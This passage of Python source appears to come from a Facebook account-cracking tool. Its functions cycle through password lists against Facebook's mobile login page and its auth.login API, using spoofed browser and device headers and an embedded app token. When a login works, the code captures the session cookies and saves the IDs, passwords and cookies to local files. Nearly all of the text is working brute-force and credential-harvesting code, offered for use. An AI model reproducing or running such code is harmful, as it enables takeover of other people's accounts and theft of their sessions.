                print(f'\r\r\x1b[38;5;46m|A x N_OK| {ids} | {pas} ')
                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                ids = "1000"+coki1[0:11]
                print(f'\r\r{R}|A x N_OK| {ids} | {pas} ')
                open('/sdcard/ASIF-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#──────────────{ RANDOM-METHOD-M5 }──────────────#
def __Randm_M5__(ids,passlist):
    global oks,cps,loop
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|ASIF-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            pron_star={'authority': 'x.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r\x1b[38;5;46m|A x N_OK| {ids} | {pas} ')
                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                ids = "1000"+coki1[0:11]
                print(f'\r\r{R}|A x N_OK| {ids} | {pas} ')
                open('/sdcard/ASIF-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#──────────────{ GMAIL-METHOD }──────────────#
def __GMAILX__(username,pswrd,total):
    global oks,cps,loop
    sys.stdout.write(f'\r\r{A}|ASIF-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
    try:
        for password in pswrd:
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            connection={'adid': adid,'format': 'json','device_id': device_id,'email': username,'password': password, 'generate_analytics_claims': '1','credentials_type': 'password','source': 'login', 'error_detail_type': 'button_with_disabled','enroll_misauth': 'false', 'generate_session_cookies': '1','generate_machine_id': '1','meta_inf_fbmeta': '', 'currently_logged_in_userid': '0','fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': randBuildLSB(), 'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793','X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            login_url='https://api.facebook.com/method/auth.login'
            req=httpx.post(login_url,data=connection,headers=header).json()
            if 'session_key' in req:
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+username+' | '+password)
                open('/sdcard/ASIF-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                oks.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r{R}|A x N_CP| '+username+' | '+password)
                open('/sdcard/ASIF-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                cps.append(username)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        	time.sleep(20)   
    except exceptions:
        pass
#──────────────{ END }──────────────#
menu()
